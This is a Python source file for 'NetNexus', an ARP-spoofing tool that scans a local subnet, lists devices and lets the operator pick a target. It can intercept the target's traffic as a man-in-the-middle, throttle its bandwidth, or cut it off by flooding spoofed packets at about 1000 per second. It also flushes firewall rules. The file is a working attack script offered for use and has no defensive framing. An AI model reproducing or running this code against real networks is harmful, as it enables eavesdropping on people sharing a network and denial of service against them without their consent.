import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof

# Shared memory for the background scanner
device_memory = {}
stop_scanner = False

def set_forwarding(state):
    """Controls IP forwarding and firewall rules for Arch Linux."""
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)

def set_limit(interface, speed):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", f"{speed}kbps", "latency", "50ms", "burst", "1540"], check=True)
    except: pass

def background_scanner(ip_range):
    """Scans the network every 0.5 seconds in the background."""
    global device_memory, stop_scanner
    while not stop_scanner:
        device_memory = scanner.scan(ip_range, device_memory)
        time.sleep(0.5)

def main():
    global device_memory, stop_scanner
    iface = "wlan0" # Verify your interface with 'ip a'
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root privileges.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"

    # Start background scan thread
    scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
    scan_thread.start()

    while True:
        print("\n" + "="*45)
        print("      NetNexus: High-Performance Build")
        print("="*45)
        
        current_list = list(device_memory.values())
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': 
            stop_scanner = True
            sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            print(f"\n[1] Intercept [2] Limit [3] Kill")
            mode = input("Action: ")

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            
            # 0.002s delay * 2 packets per loop ≈ 1000 packets per second
            wait_time = 0.002 if mode == "3" else 0.5

            if mode == "1":
                set_forwarding(True)
            elif mode == "2":
                kbps = input("Speed (kbps): ")
                set_forwarding(True)
                set_limit(iface, kbps)
            elif mode == "3":
                set_forwarding(False)

            print(f"[*] Attacking {target['ip']} at 1000 pkts/s...")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time) 
                
        except Exception as e:
            print(f"[-] Error: {e}")
        except KeyboardInterrupt:
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            spoof.restore(target['ip'], gateway_ip)
            spoof.restore(gateway_ip, target['ip'])
            print("\n[*] Resetting...")

if __name__ == "__main__":
    main()
